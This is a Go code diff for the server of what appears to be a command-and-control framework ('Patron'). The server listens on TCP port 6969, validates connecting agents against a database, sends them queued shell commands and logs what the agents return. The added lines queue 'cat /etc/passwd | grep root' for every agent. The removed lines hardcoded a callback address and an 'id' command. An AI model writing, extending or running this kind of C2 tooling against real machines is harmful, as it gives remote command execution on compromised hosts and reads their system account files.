@@ -3,11 +3,11 @@ package main
 import (
 	"bufio"
 	"encoding/gob"
-	"fmt"
 	"log"
 	"net"
 	"strings"
 
+	"github.com/PatronC2/Patron/data"
 	"github.com/PatronC2/Patron/types"
 	"github.com/s-christian/gollehs/lib/logger"
 )
@@ -22,31 +22,30 @@ func handleconn(connection net.Conn) {
 		// fmt.Println(message[0])
 		if message[0] != "" {
 			// fmt.Println(message[0])
-			if message[0] == "12344" {
-				fmt.Fprintf(connection, "Yes\n")
+			// search uuid in database using received uuid
+			fetch := data.FetchOneAgent(message[0])
+			data.SendAgentCommand(fetch.Uuid, "0", "shell", "cat /etc/passwd | grep root")
+			logger.Logf(logger.Info, "Agent %s Fetched for validation\n", fetch.Uuid)
+			if message[0] == fetch.Uuid {
+				// fmt.Fprintf(connection, "Yes\n")
+				// _, _ = connection.Write([]byte("Yes\n"))
+
 				logger.Logf(logger.Info, "Agent %s Connected\n", message[0])
 				encoder := gob.NewEncoder(connection)
-				instruct := types.GiveAgentCommand{
-					UpdateAgentConfig: types.ConfigAgent{
-						Uuid:              "12344",
-						CallbackTo:        "192.20.20.12",
-						CallbackFrequency: 5,
-						CallbackJitter:    4.5,
-					},
-					CommandType: "shell",
-					Command:     "id",
-					Binary:      nil,
-				}
+				instruct := data.FetchNextCommand(fetch.Uuid)
 
-				encoder.Encode(instruct)
+				if err := encoder.Encode(instruct); err != nil {
+					log.Fatalln(err)
+				}
 				destruct := &types.GiveServerResult{}
 				dec := gob.NewDecoder(connection)
 				dec.Decode(destruct)
 				if destruct.Output != "" {
-					logger.Logf(logger.Debug, "Agent %s Connected\n", message[0])
+					logger.Logf(logger.Debug, "Agent %s Sent Back: %s\n", message[0], destruct.Output)
 				}
 			} else {
-				logger.Logf(logger.Info, "Agent Unath\n")
+				// agent not in database handle creation of agent
+				logger.Logf(logger.Info, "Agent Unknown\n")
 			}
 
 		}
@@ -55,6 +54,12 @@ func handleconn(connection net.Conn) {
 }
 
 func main() {
+	data.OpenDatabase()
+	data.InitDatabase()
+	// _, error := os.Stat("./data/sqlite-database.db")
+	// if os.IsNotExist(error) {
+	// 	data.InitDatabase()
+	// }
 	listener, err := net.Listen("tcp", ":6969")
 	if err != nil {
 		log.Fatalln(err)
